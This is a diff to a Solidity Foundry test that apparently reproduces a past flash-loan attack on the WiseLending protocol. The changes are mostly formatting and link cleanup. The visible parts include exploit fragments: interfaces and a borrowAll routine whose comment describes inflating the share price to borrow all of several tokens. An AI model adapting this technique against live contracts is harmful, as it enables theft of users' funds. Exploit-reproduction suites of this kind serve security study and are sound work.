@@ -14,18 +14,22 @@ import "./../interface.sol";
 // Vulnerable Contract Code : https://etherscan.io/address/0x84524baa1951247b3a2617a843e6ece915bb9674#code
 
 // @Analysis
-// Post-mortem : https://www.google.com/
 // Twitter Guy : https://twitter.com/bbbb/status/1712841315522638034
 // Twitter Guy : https://twitter.com/BlockSecTeam/status/1712871304993689709
-// Hacking God : https://www.google.com/
 
 interface IPositionNFTs {
-    function mintPositionForUser(address _user) external returns (uint256);
+    function mintPositionForUser(
+        address _user
+    ) external returns (uint256);
 }
 
 interface IWiseLending {
-    function getTotalDepositShares(address _poolToken) external view returns (uint256);
-    function getPseudoTotalPool(address _poolToken) external view returns (uint256);
+    function getTotalDepositShares(
+        address _poolToken
+    ) external view returns (uint256);
+    function getPseudoTotalPool(
+        address _poolToken
+    ) external view returns (uint256);
     function depositExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
     function borrowExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
     function withdrawExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
@@ -106,7 +110,9 @@ contract ContractTest is Test {
         WBTC.transfer(address(Balancer), amounts[0]); // repay flash loan
     }
 
-    function borrowAll(uint256 id) internal {
+    function borrowAll(
+        uint256 id
+    ) internal {
         WiseLending.borrowExactAmount(id, address(wstETH), 33_538_664_799_002_267_467); // inflate share price in _coreBorrowTokens() , borrow all wstETH
         WiseLending.borrowExactAmount(id, address(WETH), 339_996_372_423_526_589);
         WiseLending.borrowExactAmount(id, address(aEthWETH), 98_969_695_913_405_122_899);
